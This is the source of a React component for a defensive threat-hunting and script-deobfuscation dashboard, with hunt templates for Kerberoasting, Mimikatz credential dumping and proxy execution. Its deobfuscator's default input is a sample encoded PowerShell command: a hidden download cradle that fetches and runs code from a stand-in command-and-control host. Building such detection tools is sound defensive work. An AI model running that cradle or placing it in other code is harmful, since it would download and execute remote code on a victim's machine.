import React, { useState } from 'react';
import { 
  Compass, 
  Terminal, 
  Code, 
  Search, 
  ShieldCheck, 
  AlertTriangle, 
  Cpu, 
  Layers, 
  Sparkles,
  ChevronRight,
  CheckCircle2,
  FileCode
} from 'lucide-react';

export default function ThreatHuntingView({ onDeployRule }) {
  const [huntQuery, setHuntQuery] = useState('');
  const [obfuscatedInput, setObfuscatedInput] = useState('powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC0AYgBlAGEAYwBvAG4ALgBkAGEAcgBrAG4AZQB0AC0AcgBlAGwAYQB5AC4AbwByAGcALwBhAHAAaQAvAGgAZQBhAHIAdABiAGUAYQB0ACcAKQA=');
  const [huntResults, setHuntResults] = useState(null);
  const [deobfuscateResults, setDeobfuscateResults] = useState(null);
  const [hunting, setHunting] = useState(false);
  const [deobfuscating, setDeobfuscating] = useState(false);

  const handleRunHunt = async () => {
    if (!huntQuery) return;
    setHunting(true);
    try {
      const res = await fetch('http://127.0.0.1:8000/api/soc/threat_hunt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ hypothesis: huntQuery })
      });
      if (res.ok) {
        setHuntResults(await res.json());
      }
    } catch (e) {
      console.error('Threat hunt failed:', e);
    } finally {
      setHunting(false);
    }
  };

  const handleDeobfuscate = async () => {
    if (!obfuscatedInput) return;
    setDeobfuscating(true);
    try {
      const res = await fetch('http://127.0.0.1:8000/api/soc/deobfuscate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ raw_script: obfuscatedInput })
      });
      if (res.ok) {
        setDeobfuscateResults(await res.json());
      }
    } catch (e) {
      console.error('Deobfuscation failed:', e);
    } finally {
      setDeobfuscating(false);
    }
  };

  return (
    <div className="space-y-4">
      {/* Top Banner: Hypothesis-Driven Threat Hunting */}
      <div className="bg-slate-900/95 rounded-xl p-4 border border-slate-800 shadow-xl space-y-3">
        <div className="flex items-center justify-between border-b border-slate-800 pb-2.5">
          <div className="flex items-center gap-2">
            <div className="p-1.5 rounded bg-slate-800 text-sky-400">
              <Compass size={16} />
            </div>
            <div>
              <h3 className="text-xs uppercase tracking-wider font-mono font-bold text-slate-100">
                Proactive Threat Hunting Workbench
              </h3>
              <p className="text-[10px] text-slate-400 font-mono">
                Query telemetry for stealthy lateral movement, living-off-the-land persistence, and C2 beacons.
              </p>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <div className="relative flex-1">
            <Search size={14} className="absolute left-3 top-2.5 text-slate-500" />
            <input
              type="text"
              placeholder="e.g. Detect living-off-the-land PowerShell download cradles with base64 encoded arguments..."
              value={huntQuery}
              onChange={(e) => setHuntQuery(e.target.value)}
              className="w-full bg-slate-950 border border-slate-800 rounded-lg pl-9 pr-3 py-2 text-xs font-mono text-slate-200 placeholder-slate-500 focus:outline-none focus:border-slate-600 transition-colors"
            />
          </div>
          <button
            onClick={handleRunHunt}
            disabled={hunting}
            className="flex items-center gap-1.5 px-4 py-2 bg-sky-600 hover:bg-sky-500 disabled:opacity-50 text-white rounded-lg text-xs font-mono font-semibold transition-colors"
          >
            <Compass size={14} className={hunting ? "animate-spin" : ""} />
            {hunting ? "HUNTING..." : "EXECUTE HUNT"}
          </button>
        </div>

        {/* Quick Hypothesis Templates */}
        <div className="flex items-center gap-2 pt-1 text-[10px] font-mono text-slate-400 overflow-x-auto">
          <span className="text-slate-500 font-semibold uppercase">Templates:</span>
          {[
            "Rubeus / Kerberoasting SPN Queries (T1558.003)",
            "LSASS Memory Dumping via Mimikatz (T1003.001)",
            "Suspicious Rundll32 / Regsvr32 Proxy Execution (T1218)"
          ].map((tpl, i) => (
            <button
              key={i}
              onClick={() => setHuntQuery(tpl)}
              className="px-2 py-0.5 rounded bg-slate-950 border border-slate-800 hover:border-slate-700 text-slate-300 transition-colors whitespace-nowrap"
            >
              {tpl}
            </button>
          ))}
        </div>
      </div>

      {/* Script Deobfuscator & Reverse Engineering Lab */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        {/* Left: Input Payload */}
        <div className="bg-slate-900/95 rounded-xl p-4 border border-slate-800 shadow-xl space-y-2.5">
          <div className="flex items-center justify-between border-b border-slate-800 pb-2">
            <div className="flex items-center gap-2">
              <Code size={14} className="text-amber-400" />
              <h4 className="text-xs font-mono font-bold text-slate-100 uppercase">
                Obfuscated Script / Command Input
              </h4>
            </div>
            <button
              onClick={handleDeobfuscate}
              disabled={deobfuscating}
              className="px-3 py-1 bg-amber-600 hover:bg-amber-500 text-black font-bold text-[11px] font-mono rounded transition-colors"
            >
              {deobfuscating ? "DECODING..." : "DEOBFUSCATE"}
            </button>
          </div>

          <textarea
            rows={7}
            value={obfuscatedInput}
            onChange={(e) => setObfuscatedInput(e.target.value)}
            placeholder="Paste obfuscated PowerShell -Enc string, cmd.exe invocation, or download cradle..."
            className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-xs font-mono text-slate-200 placeholder-slate-600 focus:outline-none focus:border-slate-700 resize-none"
          />
        </div>

        {/* Right: Deobfuscated Output & Extracted IOCs */}
        <div className="bg-slate-900/95 rounded-xl p-4 border border-slate-800 shadow-xl space-y-2.5">
          <div className="flex items-center justify-between border-b border-slate-800 pb-2">
            <div className="flex items-center gap-2">
              <FileCode size={14} className="text-emerald-400" />
              <h4 className="text-xs font-mono font-bold text-slate-100 uppercase">
                Decoded Output & Extracted IOCs
              </h4>
            </div>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded-lg p-2.5 h-[160px] overflow-y-auto text-xs font-mono space-y-2">
            {deobfuscateResults ? (
              <>
                <div className="text-emerald-400 font-semibold">
                  Encoding: {deobfuscateResults.encoding_type || "Standard Script"}
                </div>
                <pre className="text-slate-200 whitespace-pre-wrap leading-relaxed">
                  {deobfuscateResults.decoded_content || "Zero obfuscation patterns detected."}
                </pre>
                {deobfuscateResults.extracted_iocs?.length > 0 && (
                  <div className="pt-2 border-t border-slate-850 text-[10px]">
                    <span className="text-amber-400 font-bold block mb-0.5">EXTRACTED IOCs:</span>
                    {deobfuscateResults.extracted_iocs.map((ioc, idx) => (
                      <div key={idx} className="text-rose-300">• {ioc}</div>
                    ))}
                  </div>
                )}
              </>
            ) : (
              <div className="h-full flex items-center justify-center text-slate-600 text-[11px]">
                Click "DEOBFUSCATE" to analyze script structure, decode UTF-16LE, and extract C2 endpoints.
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
